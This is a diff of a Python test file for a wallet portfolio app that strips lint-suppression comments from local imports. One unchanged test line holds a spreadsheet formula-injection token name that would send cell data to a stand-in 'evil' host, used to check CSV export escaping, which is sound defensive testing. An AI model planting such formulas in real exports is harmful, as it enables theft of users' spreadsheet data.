@@ -555,7 +555,7 @@ async def test_csv_portfolio_formula_injection_neutralized(db_session: AsyncSess
 
 async def test_csv_history_formula_injection_neutralized(db_session: AsyncSession) -> None:
     """Malicious token names starting with '+' are escaped in the history CSV."""
-    from audr.operations.exports import render_history_csv  # noqa: PLC0415
+    from audr.operations.exports import render_history_csv
 
     malicious_name = '+IMPORTXML(CONCAT("http://evil/",SUBSTITUTE(A1," ","%20")),"//")'
     base = datetime(2026, 7, 1, 0, 0, 0, tzinfo=UTC)
@@ -655,7 +655,7 @@ async def test_export_full_history_window_filter(db_session: AsyncSession) -> No
 
 async def test_stream_history_csv_from_filter(db_session: AsyncSession) -> None:
     """stream_history_csv(from_=T) excludes valuation lines before T."""
-    from audr.operations.exports import stream_history_csv  # noqa: PLC0415
+    from audr.operations.exports import stream_history_csv
 
     base = datetime(2026, 8, 4, 0, 0, 0, tzinfo=UTC)
     wallet_id = await _insert_wallet(db_session, "0x" + "aa" * 20)
@@ -693,9 +693,9 @@ async def test_stream_history_csv_from_filter(db_session: AsyncSession) -> None:
 
 async def test_stream_history_csv_is_generator(db_session: AsyncSession) -> None:
     """stream_history_csv must return an async generator (not a string or coroutine)."""
-    from collections.abc import AsyncGenerator  # noqa: PLC0415
+    from collections.abc import AsyncGenerator
 
-    from audr.operations.exports import stream_history_csv  # noqa: PLC0415
+    from audr.operations.exports import stream_history_csv
 
     gen = stream_history_csv(db_session)
     assert isinstance(gen, AsyncGenerator), "stream_history_csv must return an AsyncGenerator"
